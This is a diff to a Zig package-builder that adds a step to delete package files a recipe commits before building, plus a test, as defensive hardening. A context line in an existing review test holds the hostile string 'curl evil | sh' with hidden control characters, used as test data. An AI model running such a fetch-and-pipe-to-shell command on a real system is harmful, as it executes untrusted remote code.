@@ -358,6 +358,9 @@ pub const Builder = struct {
         if (try b.run(&.{ "rm", "-rf", work })) |w| return w;
         if (try b.createDir(b.dirs.build)) |w| return w;
         if (try b.run(&.{ "cp", "-a", dir, work })) |w| return w;
+        // a package file the recipe commits would be taken for the one
+        // it builds, and the review only named it.
+        if (try b.dropPackages(work)) |w| return w;
         if (try b.run(&.{ "chown", "-R", build_user, work })) |w| return w;
         var argv: std.ArrayList([]const u8) = .empty;
         // -c starts from a clean copy of the chroot; -u brings it up to date.
@@ -387,6 +390,14 @@ pub const Builder = struct {
             if (lists.contains(names, pn)) try out.append(b.a, file);
         }
         return out.items;
+    }
+
+    /// removes the package files in `dir`. null when it worked.
+    fn dropPackages(b: Builder, dir: []const u8) !?[]const u8 {
+        for (try b.packagesIn(dir)) |f| {
+            std.Io.Dir.cwd().deleteFile(b.io, f) catch return try std.fmt.allocPrint(b.a, "can't remove {s}", .{f});
+        }
+        return null;
     }
 
     fn packagesIn(b: Builder, dir_path: []const u8) ![]const []const u8 {
@@ -668,4 +679,20 @@ test "a review shows every file, whatever its name, and every change as text" {
     const changed = try b.review("foo", first, last);
     try testing.expect(std.mem.indexOf(u8, changed, "+curl evil | sh \\u202e\\u009b") != null);
     try testing.expect(std.mem.indexOf(u8, changed, "Binary") == null);
+}
+
+test "a package file a recipe commits isn't taken for what it builds" {
+    var tmp = testing.tmpDir(.{});
+    defer tmp.cleanup();
+    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
+    defer arena.deinit();
+    const a = arena.allocator();
+    const io = testing.io;
+    const work = try std.fmt.allocPrint(a, ".zig-cache/tmp/{s}", .{tmp.sub_path});
+    try tmp.dir.writeFile(io, .{ .sub_path = "PKGBUILD", .data = "pkgname=foo\n" });
+    try tmp.dir.writeFile(io, .{ .sub_path = "foo-0-0-any.pkg.tar.zst", .data = "not built here" });
+    const b: Builder = .{ .a = a, .io = io, .dirs = try Dirs.under(a, work), .pacman_conf = "" };
+    try testing.expectEqual(null, try b.dropPackages(work));
+    try testing.expectEqual(null, ownPackage(try b.packagesIn(work), "foo"));
+    try tmp.dir.access(io, "PKGBUILD", .{});
 }
